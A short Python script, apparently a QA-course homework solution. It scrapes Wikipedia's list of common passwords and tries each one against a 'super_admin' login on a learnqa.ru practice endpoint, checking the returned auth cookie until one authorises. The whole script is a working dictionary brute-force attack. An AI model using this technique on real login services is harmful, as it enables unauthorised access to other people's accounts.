import requests
from bs4 import BeautifulSoup

# Парсим страницу и извлекаем значения для поля password
response_splash_data = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
soup = BeautifulSoup(response_splash_data.text, 'lxml')
parser_data = soup.find_all('table', class_="wikitable")[1].find_all('td', align="left")
splash_data = []
auth_cookie = ""
pass_data = ""
text = ""

for i in range(225):
    parser_text = parser_data[i].getText()
    splash_data.append(parser_text.rstrip('\n'))
uniq_splash_data = list(dict.fromkeys(splash_data))

# Сохраняем куки и получаем валидный пароль

for i in range(len(uniq_splash_data)):
    pass_data = uniq_splash_data[i]
    response_pass = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={"login": "super_admin", "password": pass_data})
    auth_cookie = response_pass.cookies.get('auth_cookie')
    response_cookie = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie", params={"auth_cookie": auth_cookie})
    text = response_cookie.text
    if text != "You are NOT authorized":
        print(pass_data, text)

